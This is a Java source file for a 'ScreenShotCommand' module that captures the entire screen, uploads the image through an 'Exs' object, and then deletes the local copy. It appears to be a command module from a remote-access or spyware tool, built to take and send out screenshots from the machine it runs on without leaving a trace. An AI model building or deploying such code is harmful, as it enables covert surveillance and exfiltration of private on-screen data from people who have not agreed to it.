package gq.glowman554.modules.impl;

import gq.glowman554.Exs;
import gq.glowman554.modules.Module;
import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.util.Random;
import javax.imageio.ImageIO;

public class ScreenShotCommand implements Module {
    private final Exs exs;

    public ScreenShotCommand(Exs exs) {
        this.exs = exs;
    }

    public String execute(String target) {
        try {
            File screenshot = capture_screen();
            String msg = this.exs.upload(screenshot);
            screenshot.delete();
            return msg;
        } catch (Exception e) {
            return e.toString();
        }
    }

    private static File capture_screen() throws Exception {
        Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
        Rectangle screenRectangle = new Rectangle(screenSize);
        Robot robot = new Robot();
        BufferedImage image = robot.createScreenCapture(screenRectangle);
        int random = (new Random()).nextInt();
        File file = new File("cached_" + random + ".png");
        ImageIO.write(image, "png", file);
        return file;
    }
}